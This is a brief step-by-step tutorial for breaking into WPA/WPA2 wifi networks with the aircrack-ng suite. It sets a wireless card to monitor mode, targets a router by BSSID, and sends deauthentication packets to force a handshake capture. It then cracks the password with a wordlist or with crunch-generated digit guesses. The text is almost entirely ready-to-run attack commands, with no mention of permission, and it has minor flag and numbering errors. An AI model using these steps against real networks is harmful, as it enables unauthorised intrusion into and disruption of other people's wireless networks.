### HOW TO CRACK WPA/WPA2 WIFI USING AIRCRACK-NG.


## TERMINAL 1


Step 1 :->  ifconfig

Step 2 :->  airmon-ng start wlan0 (the interface you want to put in monitor mode)

Step 3 :->  iwconfig (check that the wifi interface is in monitor mode or not )

Step # :->  aireplay-ng --test wlan0mon (to test that the interface is working fine in result you must 
get the maximum percentage)

Step 4 :->  airodump-ng wlan0mon 

Step 5 :->  airodump-ng -c 0 -w wpa --bssid 00:00:00:00:00 wlan0mon 

(-w WPA = is the file name you want to give to the captured file)

(-c 0= channel on which the target router is)

(--bssid = enter the target router bssid)




## TERMINAL 2


Step 6 :->  aireplay-ng -O 20 -a 00:00:00:00:00:00 wlan0mon (here type bssid of the target router which you got from the above command)

Step 7 :->  once the handshake is captured stop everything with CTRL + C.

Step 8 :->  now we will crack the password from the handshake file using the wordlist

Step 9 :->  aircrack-ng -w (path of the wordlist) filename(wpa.cap as it was defined above)

Step 10 :->  wireshark filename.cap (now scrool down till you find the deauthentication packets in the 
info tab)

### NOW WAIT FOR THE AIRCRACK-NG TO CRACK THE PASSWORD FROM THE GIVEN WORDLIST.

# WE CAN ALSO USE CRUNCH TO CRACK THE PASSWORD FROM CAPTURED HASH FILE USING PIPELINING SO WE DON'T HAVE TO SAVE THOUSANDS OF PASSWORDS FILE ON THE SYSTEM.

## Step 1 :->  crunch 8 10 0123456789 | aircrack-ng -w - filename.cap -e wifiname 
(8 10 = is the paswword length that it will start from 8 letters and test all the way till 10 letters)
